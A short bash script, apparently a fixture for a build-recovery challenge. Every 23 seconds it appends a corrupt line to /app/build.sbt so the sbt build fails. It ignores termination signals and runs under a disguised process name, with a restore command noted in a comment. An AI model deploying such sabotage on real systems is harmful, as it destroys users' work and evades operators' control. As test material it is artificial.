#!/bin/bash
# scheduler-build-saboteur
# Appends an invalid sbt directive to /app/build.sbt every 23 s, causing
# `sbt assembly` to fail to parse the build file.
# Restore: cp /var/lib/scheduler-resurrect/build.sbt.bak /app/build.sbt
# comm: "scheduler-bsabt" (15 chars)
exec -a scheduler-bsabt bash -c '
trap "" SIGTERM SIGINT SIGHUP SIGQUIT SIGUSR1 SIGUSR2
while true; do
  sleep 23
  [ -f /app/build.sbt ] && \
    printf "\nThisBuild / saboteur##corrupt##line = true\n" >> /app/build.sbt 2>/dev/null || true
done
'
